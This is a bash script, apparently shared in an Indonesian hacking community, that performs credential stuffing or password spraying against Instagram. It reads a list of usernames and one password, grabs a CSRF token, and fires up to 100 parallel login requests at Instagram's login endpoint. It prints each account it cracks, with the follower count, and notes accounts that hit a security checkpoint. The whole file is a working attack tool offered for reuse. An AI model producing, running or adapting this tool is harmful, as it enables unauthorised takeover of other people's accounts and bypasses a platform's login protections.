#!/bin/bash
#author         : ./Lolz
#thanks to      : JavaGhost - Bashid.org
#recode tinggal recode aja okeh?, tapi cantumin source Y tolol h3h3
#Yamaap kalau scriptnya acak"an:(

#color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

#thread limit => kurangin lebih kecil angkanya boleh, naikin? saran w jangan... awokwowok:v
limit=100

read -p $'\e[37m[\e[34m?\e[37m] \e[37mInput your list   : \e[1;33m' list
if [[ ! -e $list ]]; then
    echo -e "${red}file not found${white}"
    exit
    else
        cat $list > target
        echo -e "[${blue}+${white}] Total your list   : ${yellow}"$(< target wc -l)
        read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
        echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
fi
:;   
#start_brute
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                    -H "cookie: csrftoken=${token}" \
                    -H "origin: https://www.instagram.com" \
                    -H "referer: https://www.instagram.com/accounts/login/" \
                    -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
                    -H "x-csrftoken: ${token}" \
                    -H "x-requested-with: XMLHttpRequest" \
                    -d "username=${i}&password=${pass}")
                    login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                    if [[ $login =~ "true" ]]; then
                            echo -e "[${green}+${white}] ${yellow}Result! ${blue}${white}\nUsername : @$i\nPassword : $pass\nFollowers: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
                        elif [[ $login =~ "false" ]]; then
                                    echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
                            elif [[ $url =~ "checkpoint_required" ]]; then
                                    echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
                    fi
}

#thread
(
    for i in $(cat target); do
        ((thread=thread%limit)); ((thread++==0)) && wait
        brute "$i" &
    done
    wait
)

rm target